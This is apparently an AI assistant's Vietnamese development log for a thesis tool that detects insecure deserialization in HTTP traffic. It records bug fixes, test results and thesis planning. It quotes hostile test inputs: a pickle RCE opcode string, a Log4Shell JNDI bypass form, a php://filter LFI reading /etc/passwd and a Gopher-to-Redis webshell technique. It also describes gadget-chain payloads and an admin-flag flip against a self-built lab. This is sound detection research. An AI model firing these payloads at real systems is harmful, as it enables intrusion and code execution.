  - Tiện thể sửa luôn 1 chỗ tài liệu sai trong README (dòng cũ ghi "result1.json/result2.json are real captured lab data" — SAI theo đúng phát hiện đã lưu memory phiên trước: chỉ `result1.json` là thật, `result2.json` phần lớn synthetic) — cập nhật lại cho đúng.
  - **Verify:** `get_tool_path()` resolve đúng cả 4 tool tới `tools/` mới (3/4 tồn tại file thật, `ysoserial_net` vốn chưa cài từ trước — không liên quan reorg); 61/61 unit test pass; chạy thử `python main.py analyze -i results/result1.json` (qua đúng `main.py` thật, không phải test script) — chạy hết pipeline, sinh mutation hợp lệ, không lỗi đường dẫn nào.

- **`normalize.py` — bỏ giới hạn cứng "chỉ giữ 2 candidate" + `main.py` xử lý độc lập từng candidate** (phát hiện qua câu hỏi thiết kế "khoang trong normalize mình chỉ cho output max là 2 giá trị thôi à?" → "nó có hợp lý không?" → "bạn thử làm cho tôi xem"):

  **Bug gốc:** `normalize():38` (cũ) `return list(dict.fromkeys(meaningfull_data))[:2]` — cắt cứng còn 2 candidate điểm cao nhất, BẤT KỂ có bao nhiêu candidate "meaningful" độc lập thật sự tồn tại. Verify bằng JWT giả có 3 claim (`sub`/`role`/`session`), mỗi claim chứa 1 gadget PHP khác nhau (payloadA/B/C, cùng cấu trúc, cùng điểm số do `_serialized_score()` chấm bằng nhau tuyệt đối) → BFS tìm ra 5 candidate "meaningful" nhưng `[:2]` chỉ giữ 2, loại thẳng payloadB/payloadC — do `list.sort()` là stable sort nên khi hoà điểm, candidate nào sống sót chỉ phụ thuộc thứ tự BFS phát hiện, không phải "cái nào đáng giá hơn". Đồng thời `main.py:152` (cũ) `mutation_vector["value"] = value_normalize[0] if value_normalize else value` chỉ dùng candidate `[0]` cho `PayloadMutation` — verify cụ thể: candidate_A có field `admin` (privilege keyword), candidate_B độc lập có field `is_admin` riêng → chỉ 1 mutation sinh ra (flip `admin` của A), field `is_admin` của B **không bao giờ được thử flip**.

  **Fix (bước 1):** bỏ `[:2]` ở `normalize.py:38`.
  **Fix (bước 2):** `main.py:142-168` đổi từ "1 vector → 1 lần Fingerprint/ExploitAnalyze/Mutation (dùng `value_normalize[0]`)" thành lặp `for candidate in value_normalize:` — mỗi candidate độc lập được `Fingerprint([candidate])` → `ExploitAnalyze` → `PayloadMutation` riêng, tạo 1 finding riêng trong `results[]` (schema `AnalyzeEntry` không đổi, chỉ nhân số entry).

  **Bug phát sinh khi verify trên dữ liệu thật (`result1.json`, KHÔNG phải dữ liệu giả) — phải fix tiếp:**
  Sau fix bước 1+2, chạy `python main.py analyze -i results/result1.json` → 11 vector thật ra **33 entry** (thay vì 11), 2/3 là type `"Unknown"`. Root cause: `signatures.py:174` `re.search(r'(?i)Tzo[0-9]+[A-Za-z0-9+/=]*', value)` nhận diện được PHP serialize NGAY TRÊN BẢN BASE64 CHƯA DECODE (`Tzo0Oi...` = tiền tố base64 của `O:4:"`) — dùng làm fallback khi decode thất bại. Nhưng khi decode THÀNH CÔNG, cả bản base64 (url-encoded lẫn đã url-decode) VÀ bản PHP đã giải mã đều lọt qua `_is_serialized_payload()` — 3 candidate cho CÙNG 1 dữ liệu, không phải 3 exploit độc lập.

  **Fix (bước 3) — thuật toán "collapse" post-order:** thêm `children_of: dict[str, list[str]]` ghi lại quan hệ cha-con trong BFS (`normalize.py:23,35`). Viết hàm đệ quy `collapse(value, in_progress)` (post-order từ gốc `self.data`): node không "meaningful" chỉ chuyển tiếp (union) tập của các con; node "meaningful" — nếu **tổng điểm** của tập hậu duệ-đại-diện phía dưới `>=` điểm của chính nó, nó bị thay thế bởi tập đó (bản base64 chưa decode bị thay bởi bản đã giải mã điểm cao hơn); ngược lại nó "nuốt" luôn nhánh con yếu hơn và tự đại diện (payload thật không bị 1 nhánh rác ngẫu nhiên điểm thấp "vượt mặt").

  **Bug phát sinh lần 2 khi verify bằng test suite có sẵn — phải fix tiếp:** thử nghiệm collapse đầu tiên (so sánh điểm 1-cấp, không cộng dồn) làm FAIL 2 test cũ (`test_arbitrary_object_injection_lab_payload_shape`, `test_dotnet_soap_envelope_without_viewstate_still_detected`) — vì 1 nhánh rác ngẫu nhiên (từ nhánh "cố base64-decode cả bản plaintext" có sẵn ở `_generate_decodes():121` dùng `validate=False`) tình cờ được `_is_serialized_payload()` chấm là "meaningful", và logic collapse phiên bản đầu coi bất kỳ hậu duệ meaningful nào (dù điểm thấp hơn hẳn) là đủ để thay thế ancestor — xoá mất luôn payload THẬT. Fix: đổi so sánh 1-cấp thành so sánh TỔNG điểm hậu duệ (đã mô tả ở bước 3) — verify cả 3 kịch bản cùng lúc: blob base64 (điểm thấp) bị thay bởi bản decode (điểm cao) ✅; payload thật (điểm cao) KHÔNG bị rác (điểm thấp) thay thế ✅; JSON gộp 3 claim (điểm cao vì cộng dồn cả 3 pattern) bị thay bởi 3 gadget độc lập bên trong vì tổng 3 gadget `>=` điểm bản gộp ✅.

  **Bug phát sinh lần 3 — cấu trúc đồ thị sai, phải fix tiếp:** dù logic collapse đã đúng, kịch bản "JSON gộp 3 claim" vẫn KHÔNG bị loại — do `_generate_decodes():147-163` (cũ) đặt `txt` (JSON gộp) và kết quả `_extract_claim_strings(claims)` (payloadA/B/C) làm 2 KẾT QUẢ NGANG HÀNG trong cùng list trả về (anh em/sibling), không phải quan hệ cha (`txt`) → con (`payloadA/B/C`) — nên `collapse()` (chỉ xử lý được quan hệ cha-con) không thấy được mối liên hệ. Fix: bỏ `_extract_claim_strings()` ra khỏi nhánh `is_jwt_shaped`, thêm nhánh TỔNG QUÁT mới ở cuối `_generate_decodes()` — bất kỳ `value` nào parse được thành JSON (`json.loads(value)` thành công, ra `dict`/`list`) đều tự động sinh ra các claim-string bên trong làm CON của chính nó qua BFS tự nhiên (khi `txt` được BFS pop ra và gọi lại `_generate_decodes(txt)`), thay vì tính sẵn 1 lần đặc cách chỉ cho JWT.

  **Verify cuối cùng (cả 3 lớp bug đã fix xong):**
  - 61/61 unit test pass (toàn bộ `TestCase/`, cập nhật `test_normalize.py`: bỏ `test_returns_at_most_two_candidates`, thêm `test_no_hard_cap_all_independent_gadgets_survive` verify 3 gadget JWT độc lập đều sống sót).
  - `results/result1.json` (11 vector thật) → đúng lại **11 entry**, toàn bộ `type="PHP"`, KHÔNG còn noise `"Unknown"` từ base64 chưa decode.
  - Kịch bản JWT 3-gadget độc lập → `normalize()` trả đúng **3 candidate** (payloadA/B/C), JSON gộp bị loại đúng như kỳ vọng thiết kế (còn 1 candidate rác ngẫu nhiên residual do hạn chế cố hữu của `_is_serialized_payload()` — chấp nhận được, không phải regression, không làm mất field thật nào).
  - Kịch bản gốc động lực fix (candidate_A field `admin`, candidate_B ĐỘC LẬP field `is_admin`) chạy full `Fingerprint→ExploitAnalyze→PayloadMutation` cho từng candidate riêng: **2 mutation** sinh ra (trước fix chỉ 1) — field `is_admin` của candidate_B giờ **có được thử flip** (`b:0;` → `b:1;`), xác nhận lỗ hổng thiết kế ban đầu đã hết.

- **`TestCase/generate_comprehensive_har.py` — thêm ~24 malicious entry mới, "phức tạp đến rất phức tạp"** (theo yêu cầu "search Google/tài liệu, đừng bịa"). Mọi payload mới lấy nguyên văn hoặc theo đúng cấu trúc đã xác nhận qua WebSearch từ nguồn công khai (không tự chế): ysoserial CC6 (tên class thật `AnnotationInvocationHandler`/`InvokerTransformer`/`ChainedTransformer`), Log4Shell/CVE-2021-44228 JNDI (dạng thường + dạng "WAF-bypass" `${${lower:j}ndi:...}` thật được nhiều bài viết Log4Shell trình bày), CVE-2017-7525 Jackson `@class` gadget, ysoserial.net ObjectDataProvider/ExpandedWrapper (đúng cấu trúc HackTricks), .NET Remoting SOAP envelope, PHP `expect://`/`php://filter` wrapper, Gopher-to-Redis webshell (CONFIG SET dir/dbfilename+SET+SAVE — kỹ thuật SSRF-to-RCE qua Redis đã tài liệu hoá), node-serialize CVE-2017-5941 (IIFE nguyên văn từ PoC OpSecX/exploit-db), pickle opcode "textbook" RCE (`cos\nsystem\n(S'id'\ntR.`), **phpggc Monolog/RCE1 THẬT** (copy chính xác cấu trúc từ repo gốc `ambionics/phpggc/gadgetchains/Monolog/RCE/1/gadgets.php`, gồm property protected mangle `\0*\0` và token reference `r:2;`), cùng các biến thể field-type PHP (integer/string privilege, identity-only, sensitive-only) và 3 kịch bản multi-independent-gadget (PHP+Ruby khác format trong 2 claim JWT; 2 PHP privilege field độc lập; gadget lồng 3 tầng) + double/quad-layer encoding chain — test trực tiếp thuật toán `collapse()` vừa sửa.

  **Verify:** 61/61 unit test pass; full `scan`→`analyze` trên `comprehensive.har` (669 HTTP entry, 148 vector sau filter) — 0 traceback, `exploitable=True` tăng từ 30 → 52, mutation từ 43 → 104. Đối chiếu từng entry mới với kỳ vọng: CC6/JNDI-WAF-bypass/Jackson/ObjectDataProvider/SOAP/expect/gopher-webshell/node-serialize/Monolog-RCE1/PHP field-type/multi-gadget PHP+Ruby — TẤT CẢ đúng `type`/`exploit_type`/`probe` như thiết kế.

  **3 gap THẬT phát hiện được qua các payload mới (không sửa, chỉ ghi nhận — theo đúng pattern báo cáo rồi để người dùng quyết định):**
  1. **`postfiltered.py:28,42`** (`Ignore_header_name` chứa `"referer"`/`"user-agent"`) — 2 header này bị bỏ qua VÔ ĐIỀU KIỆN ở Stage 2, bất kể nội dung. Nhưng theo nhiều PoC Log4Shell công khai, User-Agent/Referer là 2 trong 3 vị trí hay dùng nhất để tiêm JNDI injection thật. Payload JNDI dạng đơn giản đặt ở đây bị loại thẳng, không bao giờ tới Stage 5. (Đã thêm 1 entry qua `X-Forwarded-For` — không nằm trong danh sách bị bỏ qua — để vẫn có test coverage cho nhánh "JNDI Injection".)
  2. **`signatures.py:226`** — danh sách từ khoá "vét cạn" cuối `looks_like_serialized()` có `"phar://"`, `"gopher://"`, `"expect://"`, `"file://"`, `"data://"` nhưng THIẾU `"php://"` — dù `php://` đã được khai báo hẳn hoi trong `WRAPPER_MODERATE` (`signatures.py:116`). Verify cụ thể: payload `php://filter/convert.base64-encode/resource=/etc/passwd` (kỹ thuật LFI thật, tài liệu hoá rộng rãi) bị `looks_like_serialized()` trả `False` → bị loại ở Stage 2, không bao giờ tới Fingerprint.
  3. **`signatures.py:206-213`** (check "trông giống 1 blob base64 thuần") có 2 vấn đề xác nhận qua payload url+base64+gzip+base64 4 tầng thật: (a) chỉ unescape `%3d`/`%3D` (dấu `=`), KHÔNG unescape các ký tự phần trăm khác như `%2F` (dấu `/`) — trong khi `decoded_value` (đã unquote đầy đủ) đã được tính sẵn ở dòng 162 của CÙNG hàm nhưng check này lại dùng `value` (chưa decode) — khiến regex `^[A-Za-z0-9+/]{20,}$` luôn fail với chuỗi có `%2F`; (b) ngưỡng `len(value_clean) > 40` cứng khiến 1 payload pickle RCE thật (22 byte raw, ~28 ký tự sau base64) bị bỏ sót dù về logic là base64 hợp lệ — trong khi bản gzip-hoá CÙNG payload (dài hơn do overhead gzip, vượt 40 ký tự) lại được nhận diện đúng — bất nhất, phụ thuộc ngẫu nhiên vào độ dài sau nén.

  **1 giới hạn residual của fix `collapse()` (bài trước) — phát hiện qua case "gadget lồng 3 tầng":** JWT có claim `profile.sessions[0].legacy` = gadget PHP thật (điểm 14.9), nằm trong JSON envelope (điểm 17.3, cao hơn do JSON escape nhân đôi số dấu `"`/`:`). Tổng điểm mọi hậu duệ meaningful của envelope (14.9 gadget + 0.8 rác ngẫu nhiên = 15.7) < 17.3 → theo logic collapse() hiện tại, envelope "thắng", gadget lồng sâu bị nuốt mất — verify bằng `normalize()` trả về đúng 1 candidate (bản JSON envelope), KHÔNG có candidate riêng cho gadget PHP. Khác với kịch bản đã fix trước đó (3 gadget dàn ngang cùng cấp, tổng điểm áp đảo rõ ràng), trường hợp này tổng điểm hậu duệ chỉ THIẾU HỤT NHẸ so với điểm envelope — cho thấy heuristic "so tổng điểm" chưa đủ robust khi container chỉ có 1 gadget thật lồng sâu (không có nhiều gadget cùng cấp để cộng dồn đủ điểm).

- **Fix 4 gap thật đã phát hiện ở bước tạo test case trên** (theo yêu cầu "fix rồi test lại all"):

  1. **[postfiltered.py:28,42](Analyze/postfiltered.py#L28)** (đã xoá) — bỏ `"referer"`/`"user-agent"` khỏi `Ignore_header_name`. Trước: 2 header này bị bỏ qua VÔ ĐIỀU KIỆN ở Stage 2, bất kể nội dung. Sau: đi qua đúng cùng luồng `_look_maybe_suspicious()` như mọi header khác (không còn ưu tiên đặc biệt).
  2. **[signatures.py:226](Utility/signatures.py#L226)** — thêm `"php://"`, `"jndi:"`, `"ldap://"`, `"rmi://"` vào danh sách từ khoá vét cạn cuối `looks_like_serialized()`. Trước: `php://filter` LFI và JNDI/LDAP injection (Log4Shell) không có BẤT KỲ nhận diện nào ở Stage 2/4, dù Stage 5/6 (`finderprint.py`/`ExploitabilityAnalysis.py`) đã có logic detect "JNDI Injection" từ lâu — logic đó thực chất là DEAD CODE với 1 payload JNDI đơn lẻ vì không bao giờ có cơ hội chạy tới.
  3. **[signatures.py:206](Utility/signatures.py#L206)** — đổi `value.replace('%3d','=')...` (chỉ unescape dấu `=`, bỏ sót `%2F`/`%2B`/...) thành `decoded_value.replace('-','+').replace('_','/').rstrip('=')` — dùng lại biến `decoded_value` (đã `urllib.parse.unquote()` đầy đủ, tính sẵn ở dòng 162 trong CÙNG hàm) thay vì tự chế 1 bản unescape thiếu sót song song.
  4. **[signatures.py:207](Utility/signatures.py#L207)** — đổi ngưỡng `len(value_clean) > 40` thành `len(value_clean) >= 20`, đồng bộ với ngưỡng `{20,}` của chính regex ngay sau nó (trước đây 2 ngưỡng lệch nhau — 40 vs 20 — khiến 1 payload base64 hợp lệ nhưng ngắn (20-40 ký tự) bị chặn dù đã thoả điều kiện regex).

  **Verify từng gap:** JNDI qua `User-Agent`/`Referer`/`X-Forwarded-For` (cả 3 dạng) → đúng `type=Java, exploit_type=JNDI Injection`; `php://filter` LFI → đúng `type=Wrapper, exploit_type=Source Code Disclosure, probe=lfi`; chuỗi encode 4 tầng (`deep-session`) → đúng `type=PHP, exploit_type=Privilege Escalation — Boolean Flip`; pickle textbook bản không gzip (`task-v2`) → đúng `type=Python Pickle, exploit_type=Python Pickle RCE`.

  **Verify không regression:** 61/61 unit test pass; `result1.json` (11 vector thật) vẫn đúng 11/11 `PHP`, không đổi; `comprehensive.har` — 0 traceback, `exploitable` tăng 52→57, mutation 104→111 (tăng đúng bằng số case vừa được unlock, không có case cũ nào bị ảnh hưởng ngược).

  **Chưa fix (để nguyên là giới hạn đã biết, rủi ro/độ phức tạp cao hơn):** giới hạn residual của `collapse()` (gadget lồng 3 tầng bị envelope JSON điểm cao hơn "nuốt mất") — nguyên nhân gốc là `_serialized_score()` cộng điểm theo số lượng `:`/`"` chung (dòng 187-188), không phân biệt được "cấu trúc JSON thông thường" với "tín hiệu serialize thật", nên 1 JSON envelope nhiều key/quote tự nhiên có điểm cao mà không cần chứa gadget. Sửa đúng cách cần tái cân chỉnh trọng số `_serialized_score()` — rủi ro ảnh hưởng dây chuyền tới toàn bộ logic chọn candidate, nên chưa động vào, chỉ ghi nhận.

## 3. Việc học thuật — quan trọng hơn code lúc này

- [ ] **Dữ liệu định lượng** — hiện chỉ có 1 ví dụ (PHP/PortSwigger). Cần chạy tool trên nhiều lab khác nhau (Java, .NET ViewState có sẵn trên PortSwigger; Pickle/YAML có thể cần tự dựng lab), ghi bảng: format × detected đúng/sai × confidence × thời gian
- [ ] **False positive rate** — chạy tool trên traffic KHÔNG có lỗ hổng, đo tỷ lệ báo động giả (hội đồng gần như chắc chắn hỏi câu này)
- [ ] **So sánh định lượng với baseline** — đo thời gian phát hiện thủ công (ysoserial/phpggc tay) vs bằng tool, thay vì chỉ so sánh tính năng (Table 1 hiện tại)
- [ ] **Literature Review thiếu paper học thuật** — hiện chỉ cite tool (ysoserial, phpggc, OWASP, PortSwigger docs), thiếu paper IEEE/ACM/USENIX về static/dynamic analysis cho deserialization
- [ ] **Threats to Validity** — chưa có mục nêu rõ giới hạn phương pháp luận (chỉ test PortSwigger — môi trường dễ phát hiện, không đại diện thật; static signature dễ false positive vì suy đoán không xác nhận runtime)
  - **Trọng số/điểm số toàn bộ pipeline là heuristic gán tay, KHÔNG học từ dataset** (tự nhận ra khi so với kiến thức môn Data Mining — weight nên được tối ưu từ dataset có label, không phải tự gán). Đếm được **17 hàm chấm điểm độc lập**, không hàm nào dùng dữ liệu để học trọng số:
    - Stage 4 (`normalize.py:159` `_serialized_score()`) — 1 hàm, chọn candidate nào giữ lại.
    - Stage 5 (`finderprint.py`) — 8 hàm `_detect_php/java/pickle/yaml/dotnet/nodejs/ruby/wrapper()` (dòng 88/124/150/167/193/212/230/243), quyết định `type`; `_calc_confidence()` (dòng 270) quy đổi điểm → Low/Medium/High cũng bằng ngưỡng gán tay.
    - Stage 6 (`ExploitabilityAnalysis.py`) — 8 hàm `_analyze_php/java/pickle/yaml/wrapper/dotnet/nodejs/ruby()` (dòng 137/255/293/331/374/405/458/504), quyết định `exploit_type`/`exploitable` (ngưỡng cố định `score >= 3`); `_calc_severity()` (dòng 35) quy đổi điểm → severity.
  - **Vì sao khó fix bằng ML thật**: dữ liệu thật duy nhất (`result1.json`) chỉ có 11 vector, cùng 1 lab, cùng 1 loại exploit — không đủ để train weight có ý nghĩa (overfit ngay). `comprehensive.har` là dữ liệu tự dựng (đã note "không phải thực tế") — nếu dùng nó để train thì weight học được chỉ phản ánh cách tự nghĩ ra payload, không phản ánh tấn công thật (bias vòng lặp). Đây là lý do thực tế, không phải bỏ qua/lười.
  - **Hướng xử lý đề xuất cho luận văn**: (1) nêu rõ đây là giới hạn phương pháp luận trong Threats to Validity — bài toán này giống signature-based detection (YARA/Suricata) hơn là ML kinh điển, ngành vẫn ưu tiên rule-based vì cần giải thích được lý do flag; (2) có thể thêm 1 mục Future Work nhỏ: dùng `generate_comprehensive_har.py` sinh thêm dữ liệu synthetic có label, thử fit logistic regression trên các feature hiện có (magic bytes có/không, số colon/quote, gadget keyword có/không...) để so sánh với weight tay — chỉ cần đề xuất hướng, chưa cần chạy thật.
- [ ] **Contribution Statement** — chưa có đoạn tóm tắt rõ ràng đóng góp chính, để hội đồng dễ so khớp với RQ
- [ ] **Trả lời câu "tool còn ý nghĩa gì khi thực tế web dùng JSON cho lẹ, mấy ai dùng serialization kiểu này"** — user tự đặt câu hỏi này khi học tới `AuthApiController.java`, ĐÂY CHẮC CHẮN LÀ câu hội đồng sẽ hỏi lúc bảo vệ, cần note kỹ để trả lời tự tin:
  - **Đồng ý 1 phần**: web MỚI/API hiện đại (microservice, SPA) hầu hết dùng JSON/JWT — tool KHÔNG tìm được gì trên các web đó, đây là giới hạn THẬT, không nên giấu.
  - **Nhưng tool không nhắm vào "web mới"** — nhắm vào 2 nhóm cụ thể vẫn tồn tại thật:
    1. **Hệ thống enterprise legacy** (ngân hàng/chính phủ/doanh nghiệp lớn) — viết từ 15-20 năm trước, lúc JSON chưa phổ biến trong Java, KHÔNG thể viết lại toàn bộ chỉ vì công nghệ mới tiện hơn (rủi ro/chi phí quá lớn) — vẫn chạy thật tới hôm nay.
    2. **Middleware/hạ tầng mà serialization là BẢN CHẤT giao thức, không phải lựa chọn dev** — VD Java RMI (JRMP), Apache ActiveMQ (OpenWire) — đổi sang JSON phải thiết kế lại cả giao thức, không đơn giản như đổi code 1 app.
  - **Bằng chứng KHÔNG PHẢI lý thuyết, mới hẳn (2023)**: CVE-2023-46604 (ActiveMQ, đã note ở mục trên) bị **ransomware khai thác THẬT năm 2023** — chứng minh lớp lỗ hổng này KHÔNG "đã chết", vẫn bị tấn công thật ngoài đời gần đây.
  - **Khung trả lời chuẩn cho Scope/Limitations**: mọi security tool đều có SCOPE riêng (tool quét SQLi không tìm ra XSS, không ai trách "vô nghĩa") — tool này scope đúng vào "hệ thống Java/.NET/PHP legacy còn dùng native serialization cho session/RPC", không claim quét được MỌI web — đây là câu trả lời TRUNG THỰC, định nghĩa scope rõ ràng, không phải chữa cháy.
- [ ] **Scope — hạ tầng + giai đoạn tool nhắm tới** (user hỏi "thesis nhắm vào cơ sở hạ tầng nào của web, giai đoạn nào" — đã trả lời, note lại để viết vào phần Scope của thesis):
  - **Hạ tầng**: Application layer (Layer 7) của web app, qua HTTP/HTTPS — dựa đúng cách tool hoạt động (`har_loader.py` đọc HAR = log HTTP, `browser_automated_scan.py` dùng Playwright vẫn là HTTP, `replay_request.py` gửi bằng `urllib.request`). KHÔNG bao gồm hạ tầng phi-HTTP (message broker như ActiveMQ, RMI/JMX) — đây là layer khác, dùng protocol riêng (OpenWire/JRMP), tool này không chạm tới.
  - **Giai đoạn (SDLC)**: tool thuộc nhóm **DAST** (black-box, không đọc source code — khác SAST như Semgrep/CodeQL quét `unserialize()` trong code, khác IAST cần agent runtime) — vận hành ở giai đoạn kiểm thử ĐỘNG trên app ĐÃ CHẠY (post-deployment), không phải lúc viết/review code.
  - **Giai đoạn (pentest methodology)**: 4 stage của tool map đúng 4 giai đoạn pentest cổ điển, thu nhỏ cho đúng 1 lớp lỗ hổng: `scan`=Reconnaissance, `analyze`=Vulnerability identification, `assess`=Exploitation/Verification, `report`=Reporting.
  - **Số liệu hỗ trợ cho phần Motivation/Background** (đã verify qua OWASP + WebSearch, không suy đoán):
    - OWASP Top 10 2017 (A8) risk rating chính thức: **Exploitability: 1 (Difficult)**, **Prevalence: 2 (Common)**, **Detectability: 2 (Average)** — nguồn: [OWASP/Top10 GitHub A8:2017](https://github.com/OWASP/Top10/blob/master/2017/en/0xa8-insecure-deserialization.md).
    - Contrast Security "2021 Application Security Observability Report": chỉ ~2% app có lỗ hổng deserialization NGHIÊM TRỌNG được xác nhận — nhưng OWASP tự ghi nhận số thấp này "CÓ THỂ do thiếu công cụ hiệu quả để phát hiện" — **đây là câu trích dẫn trực tiếp hỗ trợ lý do thesis có giá trị** (tool nhắm đúng vào gap "thiếu tool phát hiện" này).
    - Ví dụ CVE thật ở layer KHÁC (ngoài phạm vi thesis, dùng để làm rõ ranh giới Scope): CVE-2023-46604 (Apache ActiveMQ, CVSS 9.8, bị ransomware HelloKitty khai thác thật — nguồn: [Huntress](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-46604)), CVE-2020-13946 (Apache Cassandra RMI/JMX).

-37. **[FIXED — bug thật, user tự bắt được ngay lần đầu dùng]** `debug_pipeline.py --step 1 -o <file>` lưu ra **list trần** (`_emit()` dùng chung cho mọi stage, chỉ `json.dump()` thẳng) — nhưng `-i` (Stage 2+) qua `InputLoader.load()` lại bắt buộc format BỌC `{"metadata":...,"summary":...,"vectors":[...]}` ([input_loader.py:5-6](Input/input_loader.py#L5-L6)). Dùng đúng file Stage 1 vừa lưu làm `-i` cho Stage 2 → crash `AttributeError: 'list' object has no attribute 'keys'` — lỗi thật, bắt được NGAY từ lần đầu dùng feature mới thêm ở mục -36.

  **Fix** ([debug_pipeline.py](debug_pipeline.py)): Stage 1 khi lưu (`-o`) đổi từ `_emit()` (list trần) sang gọi lại ĐÚNG `save_output_file_type()` (đã có sẵn, `main.py scan` cũng dùng y hệt) — đảm bảo file Stage 1 xuất ra có CÙNG schema với `main.py scan` thật, dùng lại được cho cả `-i` của debug_pipeline VÀ `main.py analyze` thật, không tạo thêm 1 format rời rạc riêng.

  **Verify thật đúng case gây lỗi**: Stage 1 lưu file → dùng làm `-i` cho Stage 2 → chạy trót lọt (5 vector, không crash) — khớp đúng lỗi user gặp, giờ đã hết. Kiểm tra file lưu ra có đủ 3 key `metadata`/`summary`/`vectors`. 64/64 unit test vẫn pass.

-36. **[MỚI]** `debug_pipeline.py` thêm **Stage 1 (Scan)** — theo yêu cầu "thêm vô debug pipeline cho cả bước scan luôn đi, ghi thêm vô nó thành stage 1". Trước đây CHỈ nhận `-i` (scan_output.json đã có sẵn) — giờ thêm `--har`/`--url`, tái dùng ĐÚNG logic `HarLoader`/`BrowserScanner` từ `main.py` (kể cả lazy-import `BrowserScanner` để tránh phá vỡ khi chưa cài playwright — nhất quán với fix đã làm ở `main.py` trước đó).

  **Cách dùng mới**: `--step 1 --har <file>` → chỉ chạy scan, xem ngay vector thô. `--step N --har <file>` (N=2-7) → tự động chain Stage 1 scan XONG rồi chạy tiếp tới N trong CÙNG 1 lệnh, không cần 2 bước tách rời (gọi `scan` rồi `debug_pipeline` như trước). `-i` cũ vẫn dùng được y hệt (tương thích ngược hoàn toàn).

  **1 chi tiết kỹ thuật cần xử lý**: `VectorFiltering.__init__()` ([postfiltered.py:49-50](Analyze/postfiltered.py#L49-L50)) đọc cứng `self.data["vectors"]` — khi chain thẳng từ scan (không qua `InputLoader`/file), phải tự bọc `{"vectors": total_vectors}` trước khi đưa vào `VectorFiltering`, không đưa list trần.

  **Verify thật đủ 4 case**: `--step 1 --har` (chỉ scan, 15 vector) → `--step 3 --har` (chain 1→2→3, 15→5→5, khớp đúng số liệu đã có từ milestone -35) → `-i` cũ (`--step 2`, vẫn ra 5 vector y hệt) → thiếu cả `-i` lẫn `--har`/`--url` (báo lỗi rõ ràng, exit code 2 đúng chuẩn argparse) → `--step 1` mà chỉ có `-i` không có `--har`/`--url` (báo lỗi riêng, rõ ràng). 64/64 unit test vẫn pass.

-35. **[MILESTONE — lần đầu chạy FULL pipeline thật trên môi trường TỰ DỰNG]** Theo yêu cầu "chạy web này, thao tác trên đó rồi tải file har của web rồi dùng tool chạy thử" — lần đầu tiên trong cả project, tool chạy `scan→analyze→assess→report` trên traffic THẬT từ `Web_vul_env` (không phải PortSwigger đã hết hạn, không phải `comprehensive.har` synthetic).

  **Cách làm**: chạy container `php-vuln-app` thật (port 8082) → dùng `curl` thao tác login/dashboard/profile/settings/notifications THẬT (không giả lập) → tự viết script Python dựng file HAR hợp lệ (`php-app-session.har`, 6 entry) từ ĐÚNG request/response/cookie thật vừa capture (không bịa số liệu) → chạy qua WSL2 (`ethicalquoc` pipeline, có đủ PHP thật cho `phpggc` nếu cần).

  **Kết quả — ĐÚNG HOÀN TOÀN, không sai 1 case nào**:
  - `session` cookie (lỗ hổng thật, admin-flip) trên `dashboard.php` VÀ `profile.php` → baseline `401` (chưa auth) → mutated `200` (admin=true được chấp nhận) → **Confirmed** đúng — status code đổi 401→200 là tín hiệu rõ ràng server đã deserialize thành công.
  - `ref_tag` (field DECOY, không bao giờ `unserialize()`) × 4 case (2 endpoint × 2 mutation) → **Suspected**, KHÔNG bị Confirm nhầm — đúng kỳ vọng false-positive test đã thiết kế từ mục -31.
  - `session` test nhầm trên `settings.php` (endpoint không hề đọc cookie `session`) → baseline/mutated giống hệt nhau → **Suspected** đúng — true negative.
  - `report` cuối: **Confirmed: 2 | Suspected: 9** — khớp chính xác phân tích tay.

  **1 giới hạn THẬT phát hiện qua lần chạy này** (không phải bug sai kết quả, nhưng đáng ghi nhận): case `ref_tag` ra `401` ở CẢ baseline VÀ mutated — không phải vì "an toàn" theo đúng nghĩa đã thiết kế (ref_tag không bị deserialize), mà vì `ReplayRequest._send()` (`location=cookie`) **CHỈ gửi ĐÚNG 1 cookie đang test**, làm MẤT cookie `session` (xác thực) đã có trong request gốc — nên mọi request test `ref_tag` bị chặn ở bước auth TRƯỚC KHI chạm tới code echo `ref_tag` — kết luận "Suspected" vẫn ĐÚNG, nhưng LÝ DO đạt được kết luận đó chưa "sạch" (không thực sự test được hành vi deserialize của `ref_tag`, chỉ test được "thiếu session thì bị chặn"). Muốn kết luận "sạch" hơn, `_send()` cần gửi KÈM cookie khác đã biết từ request gốc, không chỉ đúng 1 cookie đang test — để dành, không fix ngay (không sai kết quả hiện tại, chỉ chưa tối ưu).

  File HAR + toàn bộ output (`scan_out.json`/`analyze_out.json`/`assess_out.json`/`report_out.json`) lưu tại `Web_vul_env/` làm bằng chứng — đây là **bộ số liệu ĐỊNH LƯỢNG THẬT ĐẦU TIÊN** từ môi trường tự dựng, có thể dùng trực tiếp cho phần "Dữ liệu định lượng" của thesis (đã note thiếu ở mục học thuật).

-34. **[MỚI — cả 2 app, đơn giản]** Theo yêu cầu "thêm phần cơ bản như lúc đăng nhập bằng role admin thì hiện xin chào admin, còn nếu bình thường thì không" — thêm dòng `"Hello, Admin!"` chỉ hiện khi `role === 'admin'`, dùng ĐÚNG field `role` đã có sẵn trong response `/api/dashboard` — KHÔNG sửa backend gì cả, chỉ thêm markup + 1 dòng JS (`document.getElementById('adminGreeting').style.display = 'block'`) trong `dashboard.html` cả Java và PHP.

  **Verify thật qua Docker**: HTML có đúng markup `adminGreeting` (cả 2 app); login thường → `role:"user"`; cookie admin-flip (tự tay sửa byte `role`/`admin` từ `"user"`→`"admin"`) → `role:"admin"` đúng cho cả 2 app — JS sẽ hiện "Hello, Admin!" khi gặp giá trị này.

-33. **[MỚI — repo `Web_vul_env`, java-app]** Mô phỏng **CVE-2026-47864** (Spring Integration — `SerializingHttpMessageConverter` deserialize trực tiếp body qua `Content-Type: application/x-java-serialized-object`, không lọc class, KHÔNG CẦN đăng nhập, công bố 27/8/2026) — theo yêu cầu "thêm nó vào web test env của tôi được không, mô phỏng CVE-2026-47864". Đây là CVE RẤT GẦN (lúc note là ~6 tuần trước), đúng framework Java PHỔ BIẾN (Spring, không phải legacy 20 năm), dùng để phản bác trực tiếp lo ngại "tool không còn ý nghĩa trong tương lai" đã bàn ở mục học thuật phía trên.

  **Khác CVE Magento (CVE-2026-103831) đã note trước** — CVE này là loại **"trực tiếp 1-request"** (không cần điều kiện tiên quyết như ghi cache trước), khớp ĐÚNG mô hình `location=raw_body` tool đã có sẵn.

